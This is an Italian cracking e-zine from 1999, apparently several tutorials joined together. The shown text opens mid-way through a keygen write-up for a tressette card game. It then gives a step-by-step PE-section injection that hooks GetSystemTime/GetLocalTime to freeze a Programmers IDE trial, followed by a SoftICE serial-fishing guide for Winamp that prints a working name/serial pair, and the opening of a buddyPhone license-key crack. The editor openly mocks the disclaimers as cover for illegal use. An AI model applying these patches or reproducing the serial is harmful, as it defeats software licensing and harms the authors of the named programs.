Var1 viene diviso per 26 e il risultato viene mandato a farsi benedire!!
?? Che cosa vi starete domandando! Infatti l'autore ha ben pensato di
prendere il resto... infatti si tratta di operazione tra interi e quindi
numeri privi di mantissa (per chi fosse a corto di codesti termini sappia
che la mantissa non  altro che quella parte che si viene a trovare a
destra della virgola, o del punto, in base alle vostre consuetudini!)

Ora che cosa viene fatto al resto ? Semplice ... se  minore di 0...
che cosa il resto minore di 0 ???? Ma che cazzo stai a dire!!!
boooo eppure funziona... che cazzo ne so io, io ho ritradotto il codice
apportando una piccola correzione.... comunque ritornando a noi....

Resto > 0 ... ci viene ritornato come valore!
Resto < 0 Resto + 26 ci viene ritornato come valore!
Resto = 0 ?? BOOOOOOOOOOOOOOOO non ne ho la pi— pallida idea!!
Io mi sono limitato a interpretare a modo mio la funzione, non a fare da
a'lfa e בeta tester all'autore...

Ora i due resti, Div' e Div'' vengono addizionati a 64 e andranno
a costituire parte della chiave....

Il tutto viene ripetuto per un numero di volte pari alla met… della lunghezza
della Username, in quanto come vi ho detto viene elaborata in due codici
alla volta!

Ora per• devo far notare un piccolo errore!! 

004040BE push    100h
004040C3 lea     eax, [ebp+var_210]
004040C9 push    eax
004040CA mov     ecx, dword_4147C8
004040D0 add     ecx, 0FCh
004040D6 call    sub_401160

Ecco questa call non l'ho mai controllata ma secondo me ricontrolla il
codice... infatti io ho notato un strano errore nel processo.. sar…
colpa mia o del programmatore ?

Provate ad inserire un nome in cui due consonanti o due vocali identiche
si vengano a trovare nella stessa word ovvero che siano rispettivamente
la prima dispari e la seconda pari... mi spiego meglio:

RA FF AE LL A  CA RR AX
   --    --       --

Vi starete domandando... che cazzo c'entra la Carr…... centra centra non
vi preoccupate, dato che la signorina possiede un nome con ben 3 gruppi
di consonanti uguali l'algoritmo di generazione dei codici ci ritorner…
in codesti 3 punti 3 bei gruppi di 0 e quindi ci ritroveremo con un codice
di registrazione non valido... infatti avremo in corrispondenza di queste
lettere 3 serie di '@@'.

A quasi dimenticavo.... il programma vuole una keyword lunga quanto 
il valore len_username.

Ora se eseguite il programma passo passo in corrispondenza di codesti
gruppi troverete indovinate un p• al posto di @@ ?? Secondo voi ??
Non ci credereste mai!! Infatti trovate proprio le lettere non modificate!
quindi FF LL e RR!!! Che delusione ;( non meritava manco che ci spendessi
sopra 5min per trovarmi il mio seriale e 1ora per capire l'algo... sar•
lento io o sar… inteligente il programmatore ?

004040DB lea     eax, [ebp+var_310]
004040E1 lea     ecx, [ebp+var_210]

Ecco un altro fatidico frammento di codice!!!!!
Che cosa fa ? bene in eax ci trovate il vostro mitico numero di registrazione
... non l'esatto ma quello che voi avete messo! Provate a battere d eax
e lo troverete... e in ecx il seriale esatto costituito da una massa di
lettere in maiuscolo!!

Ora non vi basta quindi che scrivere d ecx ed ecco a voi il vostro bel codice
...... infatti le istruzioni sotto lo controllano ;)

004040E7 loc_4040E7:
004040E7 mov     dl, [eax]
004040E9 cmp     dl, [ecx]
004040EB jnz     short loc_404107 ; Non sono uguali ? bye bye!!!

; Sono uguali ! bye bye protezione!!!
004040ED or      dl, dl
004040EF jz      short loc_404103
004040F1 mov     dl, [eax+1]
004040F4 cmp     dl, [ecx+1]
004040F7 jnz     short loc_404107
004040F9 add     eax, 2
004040FC add     ecx, 2
004040FF or      dl, dl
00404101 jnz     short loc_4040E7


Ok codesto articolo  terminato... passiamo alla parte finale!
Se siete appassionati giocatori di tressette e sarete interessati ad usare
questo programma, beh non so che dirvi... buon divertimento!!!
Per quanto riguarda il generatore di codici di registrazione, spero di
essere stato quanto pi— chiaro sia possibile! Troverete allegato, sempre
se N0BODY lo riterr… opportuno, il generatore pronto all'uso... scritto
in linguaggio C altrimenti mi sarei dovuto addormentare! Non riporto il
codice perch mi sembra una politica scorretta... cos voi piazzate il
vostro nome e passa pure che l'avete scritto voi...

Ok ora passo a quanto ci ho perso su questo programma... sul mIRC che
spero avrete apprezzato ci ho messo circa 2 pomeriggi a capire... su
questo invece 5min a trovarmi la mia password, 1ora a capire l'algo,
un'altra ora per scrivere il keymaker testando il programma e
2 ore a scrivere il tute.... vabb se non l'avessi scritto solo un
paio d'ore... ma lasciamo stare!

Consumazioni: Mezzolitro di acqua e 2 bicchierini di VODKA ai frutti di
              bosco (l'unica che ho trovata in casa... anzi non ho guardato
              se c'era grappa.. preferisco di gran lunga la grappa).

Ringraziamenti: }^CoBrA^{ che mi ha chiesto di crackare il programma....
               Mr. Gima che c'ha rotto le scatole chiedendo il keymaker
               N0bodY88 che pubblica questo articolo... + l'intervista
               che ci ha fatto ieri sera.. ;)

               LETHALMIND per avermi fatto capire come funziona il zozzo
               di Windows (... sto sfornando un virus semplice semplice
               che dovrebbe funzionare su 95, 98, NT e forse pure il WIN2000)

Saluti: Johnny, [alt255], WarFelix, War^Web, eXceptiON HandlER, Artiglio
        LanDLorD, Mr. Gima, tutti i frequentatori di #crack-it
        #programmazione, ZioFill perch tiene secondo me sogni assurdi,
        tipo la sua ultima idea per gestire il modem (poi ti spiego
        meglio il DTR o Data Terminal Ready... per• in chat non in ICQ!)
        e il suo progetto folle di un virus che intercetti la parola
        "scuola" sul pc... ;) , spd o meglio iodio, warcat e tutti
        quegli altri che mi conoscono o che ho conosciuto e di cui
        non ricordo il nome... o il discorso che abbiamo fatto l'ultima volta!

Per qualsiasi informazioni potrete mandarmi una mail a cod@gurlmail.com
mi potrete contattare su ICQ, comunque il numero non ve lo do qui!

Un'ultima nota prima di concludere: questo non  il pi— deficente...
WinAmp  peggio e buddyPhone peggio ancora.. ma su buddyPhone un giorno
forse ve ne parlo.

NOTA: IO cod NON MI ASSUMO NESSUNA RESPONSABILITA' PER LE PERDITE CHE
VOLONTARIAMENTE E INVOLONTARIAMENTE CAUSO ALL'AUTORE DEL SOFTWARE...
PURTROPPO SEI CAPITATO TU MA POTEVA ESSERE UN'ALTRO... MAGARI UN TUO
CONCORRENTE...
INOLTRE NON MI ASSUMO LA RESPONSABILITA' PER EVENTUALI STRONZATE CHE
POTRETE COMMETTERE NEL TENTATIVO DI CRACKARE IL PROGRAMMA SEGUENDO
QUESTO ARTICOLO. IL TUTTO E' FATTO ALLO SCOPO DI FAR ENTRARE NELLA VOSTRA
SCATOLA CRANICA QUALCHE CONOSCENZA DEL PC IN PIU'.

Musica ascoltata durante le varie fasi:
Marilyn Manson - Mechanical Animals !!!!! MITIKOOOOO CERCO GLI ALTRI 3 ALBUM!
Metallica      - Master of Puppets
Metallica      - Reload
Metallica      - Ride the lightning

p.s. se vi state domandando perch ascolto questi album vi rispondo subito!
     So gi… mezzo fuso, forse l'avrete potuto notare, ma in ogni caso se
     resto davanti a SoftICE senza ascoltare sta musica mi rincoglionisco!
     Quindi se dovete crackare fate quanto segue:
     Liquore, vino o birra per capire meglio
     Musica rumorosa, per far restare il vostro cervello in funzione
     altrimenti uscite dalle sessione di SICE come delle larve! Io compreso!!

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                     [x] ringZ3r0  Proudly Presents [x]
        +-----------------------------------------------------------+
        Come inserire una nuova sezione e una nuova funzione in un PE

                                by Pusillus

                               19 aprile 1999

------------------------------------------------------------------------------
LE INFORMAZIONI CHE TROVATE ALL'INTERNO DI QUESTO FILE SONO PER PURO SCOPO
DIDATTICO. L'AUTORE NON INCORAGGIA CHI VOLESSE UTILIZZARLE PER SCOPI ILLEGALI.
------------------------------------------------------------------------------

Quello che viene presentato in questo tute e' uno studio su come intercettare
le funzioni che interrogano il sistema sulla data (GetSystemTime e
GetLocalTime) in modo da reindirizzare tali chiamate verso una routine dummy
che restituisce sempre la stessa data ed ora.
Dato che molti programmi shareware hanno un periodo di scadenza e dopo un
certo tempo diventano inutilizzabili, se fosse restituita sempre la stessa
data il programma non raggiunggerebbe mai la scadenza.
In realta' bisogna dire che questo sistema non e' sempre applicabile. Ad esempio
in un programma tipo agenda o calendario se restituissimo sempre la stessa
data e ora questi diventerebbero inutilizzabili.

Ma quello che e' interessante, a mio avviso, e' la sostituzione di una funzione
con un altra fatta da noi e l'aggiunta di una nuova sezione di codice. Questa
tecnica potrebbe essere utilizzata in tante altre occasioni, le funzioni
GetSystemTime e GetLocalTime sono state prese solo come spunto per un esempio
pratico.

I passi fondametali che seguiremo sono:

1) Aggiunta di una nuova sezione al file eseguibile PE e aggiornamento del
   l'header: il piu delle volte alla fine della sezione .text c'e' abbastanza
   spazio per aggiungere qualche linea di codice asm ma non sempre e'
   sufficente per i nostri scopi. Anche nel programma che ho preso come
   target la routine sarebbe comodamente entrata alla fine della sezione
   .text, ma e' stata comunque aggiunta una nuova sezione. 
   
2) scrittura della dummy routine nella nuova sezione appena creata.

3) dirottamanto delle funzioni GetsystemTime e GetLocaltime verso la nostra
   routine.

Il programma che ho scelto come target e' lo stesso per il quale avevamo fatto
un keygen: Programmers IDE.
Se il programma risulta registrato potrete agevolmente cancellare la
registrazione con il Regedit.

Per prima cosa dobbiamo incrementare le dimensioni dell'eseguibile aggiungendo
alcuni bytes in coda al file.
Con HIEW in modalita' HEX spostiamoci alla fine del file, andando in edit mode
sara possibile aggiungere dei bytes, nell'esempio io ho aggiunto 128 bytes
digitando tutti zeri.

A questo punto bisogna fare e' una modifica all'header del file PE per
aggiungere una nuova sezione: con HIEW apriamo il file project.exe e settiamo
la modalita' HEX, dopo la signature per il dos sara' possibile notare i
caratteri "PE" che indicano l'inizio dell'header PE (SIGNATURE BYTES), se ci
spostiamo di 7 bytes saremo dentro la sezione "# OBJECTS" per aggiungere una
nuova sezione bastera incrementare questo valore di 1. 

    +-------------------------------------------------------+
    ¦      SIGNATURE BYTES      ¦  CPU TYPE   ¦  # OBJECTS  ¦ &lt;------
    +---------------------------+---------------------------¦
    ¦       TIME/DATE STAMP     ¦         RESERVED          ¦
    +---------------------------+---------------------------¦
    ¦          RESERVED         ¦  NT HDR SIZE¦    FLAGS    ¦
    +---------------------------+---------------------------¦
    ¦  RESERVED   ¦LMAJOR¦LMINOR¦         RESERVED          ¦
    +---------------------------+---------------------------¦
    ¦          RESERVED         ¦         RESERVED          ¦
    +---------------------------+---------------------------¦
    ¦       ENTRYPOINT RVA      ¦         RESERVED          ¦
    +---------------------------+---------------------------¦
    ¦          RESERVED         ¦        IMAGE BASE         ¦
    +---------------------------+---------------------------¦
    ¦       OBJECT ALIGN        ¦        FILE ALIGN         ¦
    +---------------------------+---------------------------¦
    ¦  OS MAJOR   ¦  OS MINOR   ¦USER MAJOR   ¦USER MINOR   ¦
    +-------------+-------------+---------------------------¦
    ¦ SUBSYS MAJOR¦ SUBSYS MINOR¦         RESERVED          ¦
    +---------------------------+---------------------------¦
    ¦        IMAGE SIZE         ¦       HEADER SIZE         ¦
    +---------------------------+---------------------------¦
    ¦       FILE CHECKSUM       ¦  SUBSYSTEM  ¦  DLL FLAGS  ¦
    +---------------------------+---------------------------¦
    ¦   STACK RESERVE SIZE      ¦     STACK COMMIT SIZE     ¦
    +---------------------------+---------------------------¦
    ¦   HEAP RESERVE SIZE       ¦     HEAP COMMIT SIZE      ¦
    +---------------------------+---------------------------¦
    ¦         RESERVED          ¦  # INTERESTING RVA/SIZES  ¦
    +---------------------------+---------------------------¦
    ¦   EXPORT TABLE RVA        ¦   TOTAL EXPORT DATA SIZE  ¦
    +---------------------------+---------------------------¦
    ¦   IMPORT TABLE RVA        ¦   TOTAL IMPORT DATA SIZE  ¦
    +---------------------------+---------------------------¦
    ¦  RESOURCE TABLE RVA       ¦  TOTAL RESOURCE DATA SIZE ¦
    +---------------------------+---------------------------¦
    ¦  EXCEPTION TABLE RVA      ¦  TOTAL EXCEPTION DATA SIZE¦
    +---------------------------+---------------------------¦
    ¦  SECURITY TABLE RVA       ¦  TOTAL SECURITY DATA SIZE ¦
    +---------------------------+---------------------------¦
    ¦    FIXUP TABLE RVA        ¦  TOTAL FIXUP DATA SIZE    ¦
    +---------------------------+---------------------------¦
    ¦    DEBUG TABLE RVA        ¦  TOTAL DEBUG DIRECTORIES  ¦
    +---------------------------+---------------------------¦
    ¦  IMAGE DESCRIPTION RVA    ¦  TOTAL DESCRIPTION SIZE   ¦
    +---------------------------+---------------------------¦
    ¦   MACHINE SPECIFIC RVA    ¦   MACHINE SPECIFIC SIZE   ¦
    +---------------------------+---------------------------¦
    ¦  THREAD LOCAL STORAGE RVA ¦      TOTAL TLS SIZE       ¦
    +-------------------------------------------------------+
   
Il prossimo passo e' quello di aggiungere una nuova entry nella "object table"
per assegnare alla nuova sezione un nome, una VistualSize, un RVA, una
PhisycalSize un Offset, e i flags: la "object table" e' situata immediatamente
dopo l'header pe infatti spostandoci con hiew sotto l'header si potranno
notare i nomi delle varie sezioni : .text, .rdata, .data, ecc.

    +-------------------------------------------------------+
    ¦                     OBJECT NAME                       ¦
    +-------------------------------------------------------¦
    ¦       VIRTUAL SIZE        ¦           RVA             ¦
    +---------------------------+---------------------------¦
    ¦      PHYSICAL SIZE        ¦      PHYSICAL OFFSET      ¦
    +---------------------------+---------------------------¦
    ¦        RESERVED           ¦         RESERVED          ¦
    +---------------------------+---------------------------¦
    ¦        RESERVED           ¦       OBJECT FLAGS        ¦
    +-------------------------------------------------------+
   
Come e' possibile notare dalla tabella ogni entry e' composta di 40 byes
bisognera' quindi spostarsi di di 40 bytes dall'ultima sezione, nel nostro
caso .reloc, e iniziare ad assegnare le proprieta alla nostra nuova sezione:

OBJECT NAME: il nome che ho scelto di assegnare e' ".pippo", un classico! :))

VIRTUAL SIZE: indica al loader quanta memoria deve essere allocata per il
caricamento dell'object, per non sbagliarmi io ho messo il numero dei bytes
aggiunti all'eseguibile : 80h.

RVA : rappresenta l'ndirizzo a cui e' relocato l'object relativamente alla
Image Base. se in modalita HEX con HIEW premiamo F8 compariranno varie
informazioni sul PE-header tra queste ci sara anche "Image Base 00400000",
premendo ora F6 comparira' la tabella delle sezioni:

  +-Number  Name   VirtSize   RVA    PhysSize  Offset    Flag---+
  ¦     1 .text    00021754 00001000 00021800 00000400 60000020 ¦
  ¦     2 .rdata   00000988 00023000 00000A00 00021C00 40000040 ¦
  ¦     3 .data    00016920 00024000 00007C00 00022600 C0000040 ¦
  ¦     4 .idata   0000165E 0003B000 00001800 0002A200 C0000040 ¦
  ¦     5 .rsrc    0000D1FC 0003D000 0000D200 0002BA00 40000040 ¦
  ¦     6 .reloc   000029C8 0004B000 00002A00 00038C00 42000040 ¦
  ¦                                                             ¦
  ¦                                                             ¦
  ¦                                                             ¦
  ¦                                                             ¦
  ¦                                                             ¦
  ¦                                                             ¦
  +-------------------------------------------------------------+

sulla colonna degli RVA ci sono tutti gli indirizzi virtuali relativi alla
Image Base. Se sommiamo l'RVA dell'ultima sezione (.reloc) con la sua
Phisical Size otteniamo l'ultima posizione occupata dalla sezione: 4b000+2a00
= 4da00. Da questo valore possiamo ricavare un RVA per la nostra nuova sezione
che dovra' essere &gt; 4da00, nel mio esempio ho scelto il valore 4e000.
 
PHYSICAL OFFSET: non sarebbe altro che l'indirizzo assoluto dall'inizio del
file. spostiamoci con HIEW sull'ultimo byte della sezione .reloc (0044d9ff)
premiamo ALT-F1 e otteremo l'indirizzamento globale.
l'offset della nuova sezione si trova all'indirizzo 003b600.

OBJECT FLAGS: questa nuova sezione dovra avere le caratteristiche: __Code
object, __Executable object, __Readable object. Le stesse della sezione
.text :  60000020h.

Questa e' una schermata di hiew con le modifiche apportate alla object table:

00000240:  2E 72 65 6C-6F 63 00 00-C8 29 00 00-00 B0 04 00  .reloc  +)   _
00000250:  00 2A 00 00-00 8C 03 00-00 00 00 00-00 00 00 00   *   מ
00000260:  00 00 00 00-40 00 00 42-2E 70 69 70-70 6F 00 00      @  B.pippo
00000270:  80 00 00 00-00 E0 04 00-80 00 00 00-00 B6 03 00  +    _ +    ¦
00000280:  00 00 00 00-00 00 00 00-00 00 00 00-20 00 00 60                 `

A questo punto la nuova sezione dovrebbe essere presente, se chiudiamo e
riapriamo il file con hiew la object table dovrebbe apparire cosi':

+-Number  Name   VirtSize   RVA    PhysSize  Offset    Flag---+
¦     1 .text    00021754 00001000 00021800 00000400 60000020 ¦
¦     2 .rdata   00000988 00023000 00000A00 00021C00 40000040 ¦
¦     3 .data    00016920 00024000 00007C00 00022600 C0000040 ¦
¦     4 .idata   0000165E 0003B000 00001800 0002A200 C0000040 ¦
¦     5 .rsrc    0000D1FC 0003D000 0000D200 0002BA00 40000040 ¦
¦     6 .reloc   000029C8 0004B000 00002A00 00038C00 42000040 ¦
¦     7 .pippo   00000080 0004E000 00000080 0003B600 60000020 ¦
¦                                                             ¦
¦                                                             ¦
¦                                                             ¦
¦                                                             ¦
¦                                                             ¦
+-------------------------------------------------------------+

Un'ultima cosa da fare e' quella di modificare nell'header il valore della
Image Size sommandogli il valore della VirtualSize della nuova sezione
altrimenti sotto NT il programma non girerebbe: 04e000 + 80 = 04e080.

La prima parte del lavoro e' completata, adesso bisogna implementare la
funzione che andra' a sostituire GetSystemTime e GetLocalTime nella nuova
sezione appena creata:
Il parametro che viene passato alle funzioni e' un puntatore ad una struttura
di tipo SYSTEMTIME:

typedef struct _SYSTEMTIME {  // st  
    WORD wYear; 
    WORD wMonth; 
    WORD wDayOfWeek; 
    WORD wDay; 
    WORD wHour; 
    WORD wMinute; 
    WORD wSecond; 
    WORD wMilliseconds; 
} SYSTEMTIME; 

non bisogna far altro che scrivere qualche riga di asm per riempire i campi
della struttura con dei valori falsi:

.0044E000: 55                           push      ebp
.0044E001: 8BEC                         mov       ebp,esp
.0044E003: 57                           push      edi
.0044E004: 8B7D08                       mov       edi,[ebp][00008]	; puntatore alla struttura
.0044E007: 66C74700CC07                 mov       w,[edi][00000],007CC  ; wYear = 1996
.0044E00D: 66C747060100                 mov       w,[edi][00006],00001	; wDay  = 01
.0044E013: 66C747020100                 mov       w,[edi][00002],00001  ; wMonth= 01
.0044E019: 66C747080200                 mov       w,[edi][00008],00002  ; wHour = 02
.0044E01F: 66C7470A0300                 mov       w,[edi][0000A],00003  ; wMinute=03
.0044E025: 66C7470C0400                 mov       w,[edi][0000C],00004  ; wSecond=04
.0044E02B: 31C0                         xor       eax,eax
.0044E02D: 40                           inc       eax
.0044E02E: 5D                           pop       ebp
.0044E02F: 5F                           pop       edi
.0044E030: C20400                       retn      00004 

Ora non rimane altro che andare a cercare le call alle funzioni in oggetto e
sostituirle con delle call alla nuova funzione. Nel programma che ho preso in
esame c'erano due sole call:

.004188CC: FF15C4B54300                 call      GetLocalTime ;KERNEL32.dll
.004188D2: 8D4C2404                     lea       ecx,[esp][00004]
.004188D6: 51                           push      ecx
.004188D7: FF1504B64300                 call      GetSystemTime ;KERNEL32.dll
.004188DD: 668B0D7A2C4300               mov       cx,[000432C7A]

Bisognera calcolare l'offset a cui punta la call rispetto alla istruzione
successiva, quindi nel caso della prima call 44E000 - 4188D1 = 03572F e per
la seconda 44E000 - 4188DC = 035724 :

.004188CC: E82F570300                   call     .00044E000   
.004188D1: 90                           nop
.004188D2: 8D4C2404                     lea       ecx,[esp][00004]
.004188D6: 51                           push      ecx
.004188D7: E824570300                   call     .00044E000   
.004188DC: 90                           nop

Il programma adesso dovrebbe essere sempre in trial, infatti la versione
originale dopo 30 giorni da una messagebox di avvertimento che il periodo di
prova e' scaduto e la splash screen che si presenta all'avvio dura parecchio
tempo, con la versione modificata sarete sempre dentro i 30 giorni della
trial :))

Bibliografia: "PORTABLE EXECUTABLE FORMAT"      Micheal J. O'Leary (sulla rete)
              "The PE file format"              B. Luevelsmeyer    (sulla rete)
              "il tute di killexx sui crypter"  Killexx            (Ringzer0)  

Ringraziamenti:

a Killexx che e' sempre disponibile a dare spiegazioni :) 
Insano che ci sopporta.
Malattia anche se e' un po che non lo sento :(
A tutti gli altri membri di RingZer0, anche se purtroppo non ho mai occasione
di parlare con loro :(

Pusillus.

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
NOTA BY N0bodY88 = un tnx particolare va ai membri di Ring0 x averci dato il
                   permesso di poter pubblicare tale tut sulla ns e-zine e
                   ovviamente un grosso ringraziamento va anke a Pusillus x
                   averci dato lui stesso il primo via libera alla pubblicazio
                   ne. Che dire... complimenti a Pusillus e a tutti quelli di
                   Ring0 che sono dei fari nella notte buia di questa scena
                   italiana assieme ad altri miti quali Xoanon, +Malattia,
                   il tuttofare \sPIRIT\, Quequero, tutti i frequentatori del
                   canale #crack-it e della mitica UIC.
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                 ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                 ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                 ÷³       DIAMO I NUMERI CON WINAMP      ³÷
                 ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                 ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

Autore: Johnny
Titolo: Diamo i numeri con Winamp (cod> me li posso giocare al lotto ?)
Target: Winamp 2.x (www.nullsoft.com cod> qualsiasi cd in edicola...)
Difficolt…: LIVELLO 2 (... mi sembra che alla nullsoft non si diano tanto
                           da fare contro la pirateria ...               )

NOTA: ove incontrerete la scritta cod>
      saranno commenti di cod.. che revisione l'articolo per pubblicarlo
      all'insaputa dell'autore :)

TOOLS:
Soft Ice 3.x

DISCLAIMER
LE INFORMAZIONI CONTENUTE ALL'INTERNO DI QUESTO DOCUMENTO SONO SOLO A FINI
DIDATTICI, NON INCORAGGIO CHI VOLESSE UTILIZZARLI PER ALTRI SCOPI.
NON MI ASSUMO RESPONSABILITA' SE VI SCASSATE I PROGRAMMI.

cod> Se non avete capito bene il disclaimer ve lo spiego meglio io....
cod> Le informazioni contenute qui sono a scopo didattico ma il loro
cod> uso sar… in ogni caso illegale... quindi non fateci caso...
cod> sono le solite fesserie che un autore dovrebbe scrivere per dire alla
cod> comunit… che lui non ha visto niente in quanto non c'era e se c'era
cod> dormiva.... :)
cod> Comunque buon Winamp registrato a tutti!

In questo tutorial vedremo come estrarre un numero di registrazione
dal Winamp (volete che vi spieghi cos‚? No, lo sanno tutti!). Per adesso
lasceremo da parte il crack vero e proprio perch  un po difficilino
(anche da spiegare).
cod> si potrebbe ricavare un'altro articolo da come genera il seriale
cod> ma il nostro Johnny non vuol essere cos buono... vi tocca
cod> farlo da soli, quindi armatevi di santa pazienza e di Soft ICE.

Ok, mettiamo Soft Ice in memoria, installiamo il nostro bel programmino,
prendiamo qualcosa da bere (coca-cola, martini o ???)
e qualcosa da magn… OOOH MA VI DEVO DIRE TUTTO IO????
cod> non fate caso... Johnny tende ad alzare il gomito... :)

- - - LET THE SHOW BEGIN - - -

Bene, ora avviamo Winamp.exe; click di destra sul Winamp, Shareware|Enter
registration info. Mettiamo un nome (io metto JoHnNy) e un numero
(io metto 112233). Notiamo che non possiamo clickare sul bottone Ok;
perfetto il tutorial  finito, alla prossima!
cod> di gi… ? ... lo facevo pi— lunghetto :(

Hey Hey stavo scherzando, ripetiamo l'operazione:
mettiamo il nome, il numero, ctrl+D e settiamo un breakpoint su
getdlgitemtexta (per chi non lo sapesse si deve scrivere bpx getdlgitemtexta).
Ora aggiungiamo un altro numero (ad esempio 4, cosi' il numero sara' 1122334),
a questo punto il SoftIce dovrebbe poppare. Premiamo F11 per uscire dalla
call, dovremmo trovarci qui:

cod> per chi non lo sapesse GetDialogItemTextA legge da un box il testo
cod> inserito... consultate le WinAPI se volete avere info maggiori.

:00401eb9 push 00
:00401ebb push 00
:00401ebd push ebx
:00401ebe push edi
:00401ebf call [USER32!GetDlgItemInt]

Prima di inziare a scazzafugliare nel codice, diamo uno sguardo ai registri:
in eax troviamo la lunghezza del nome inserito (per credere scrivete ? Eax);
ora premiamo F10 (trace) fino a quando arriviamo qui:

:00401ec5 mov esi,eax <-- Mette in eax il numero inserito
:00401ec7 lea eax,[ebp-80]

Scriviamo ? eax e vedremo il numero che abbiamo inserito;
Steppiamo (F8) una volta sola fino ad arrivare a:

:00401eca push eax <-- Schiaffa il nostro nome in eax
:00401ecb call 00425c01 <-- Chiamata alla routine che genera il numero esatto

Scriviamo d eax per vedere il nome; continuiamo a steppare fino a:

:00401ed0 cmp eax,esi <-- Confronta il nostro numero con quello giusto
:00401ed2 pop ecx
:00401ed3 jnz 00401edf <-- Va a 00401edf se il numero  sbagliato

Scriviamo quindi ? eax per vedere il nostro vero numero di registrazione,
bc * per annullare il breakpoint che avevamo settato;
ora mettiamo il numero di registrazione corretto et voil…,
il Winamp  registrato e noi non abbiamo modificato neanche una virgola
di codice!!!
cod> semmai manco un byte... perch le virgole stanno nel sorgente...
cod> da quanto ho potuto osservare non ne ho viste virgole....

Stavolta il tutorial  davvero finito. Spero che abbiate imparato qualcosa
di nuovo e soprattutto di utile. Ringrazio cod per i suoi consigli, per gli
aiuti e per la gentilezza nell'assistermi in tutti i miei progetti
(NON TI MONTARE LA TESTA PERO'). Saluto tutti i membri del gruppo e-ViP
e quel pazzo di }Zu{L}u{  CIAO!.

cod> NON MI MONTO LA TESTA... ASSISTENZA ? HAI CHIAMATO AL TELEFONO E NON
cod> HO CAPITO UN CAZZO DI QUELLO CHE STAVI DICENDO... COMUNQUE POI QUANDO
cod> HAI DETTO CHE ERA WINAMP MI SONO MESSO PURE IO ALLA RICERCA DEL MIO
cod> NUMERO.
cod> Comunque faccio notare ai lettori che se non erro la nullsoft abbia
cod> messo in circolazione Winamp gratis a partire dalla 2.50...
cod> 
cod> Dato che forse molti di voi non hanno dimistichezza con l'assembler
cod> e non avrete di sicuro SoftICE vi riporto qui un numero per un nome...
cod> Nome: Antonio
cod> S.N.: 45574006

cod> Per qualsiasi protesta fate riferimento a Johnny.. non venite a rompere
cod> a me...
cod> Ciao a tutti!


ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

                 ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
                 ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
                 ÷³       BUDDYPHONE 2.03 CRACKING       ³÷
                 ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
                 ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

 Autore: cod/e-ViP
Oggetto: buddyPhone 2.03
   Data: 14 Ottobre 1999
 e-mail: cod@gurlmail.com

Musica ascoltata:
 Metallica - Master of Puppets
           - Load
           - Ride the Lightning
           - Reload
           - Garage, Inc.

Obiettivo: Per il momento ci troveremo il key di registrazione, poi si vedr…
           ;)

buddyPhone per chi non lo conoscesse  una semplice utilit… che vi permette
di dialogare in tempo reale con un vostro amico (o amica) usando semplicemente
INTERNET. La condizione necessaria affinch questo avvenga  che entrambi
gli utenti abbiano abilitato buddyPhone, che siano collegati alla rete e
che abbiano un buon modem per scambiare le informazioni in modo veloce.

Allora vediamo innanzitutto di procurarci il programma, lo potrete
scaricare dalla rete dall'indirizzo http://www.pfluger.de/buddyphone2
o pi— semplicemente lo trovate allegato ad un qualsiasi CD di tutte quei
giornali che parlando di informatica (leggi PC Magazine, Pc Floppy+Magazine,
Pc World, Pc Action, inter.net, Computer Magazine, Gigabyte (lo pubblicano
ancora ? boooo) e pi— ne avete pi— ne mettete!).

Installato il programma avviamolo... ci compare una belle finestra in alto
a sinistra sul monitor, e in alto a questa finestra la pubblicit…!! In poche
parole questo programma si finanzia se voi non lo comprate trasferendovi
pubblicit… e magari dati dal server!!! O viceversa... lui trasferisce i vostri
dati.... Insieme a questa bella pubblicit… troveremo un pulsanto, che ci
recita 'Enter license Key...' in poche parole COMPRATELO SE LO USI!
Ok... lo voglio comprare!!!  Quanto costa ? Non me lo dice... mi dice solo
di collegarmi al sito http://www.pfluger.de/buddyphone2/buy.html ... ma
approposito... io non ho la carta di credito... quindi mi sa tanto che
non lo posso comprare... vabb ci rinuncio a comprarlo ma lui quella fottuta
finestra la deve fare sparire! Non la deve fare sparire... sparir…!!! Come
ancora non ho deciso... se vi spiego a fregare il seriale oppure nel mio
cervello bacato mi viene l'idea di fare un keymaker (... ora le proposte
sono le seguenti: Johnny vuole sapere come si prende il seriale, il mio
vicino di casa mi ha chiesto di fare il keymaker... sono indeciso...).

Allora per incominciare accontentiamo Johnny... clickiamo su Enter license
key... e vediamo cosa ci chiede:
First name, Last name, License key...

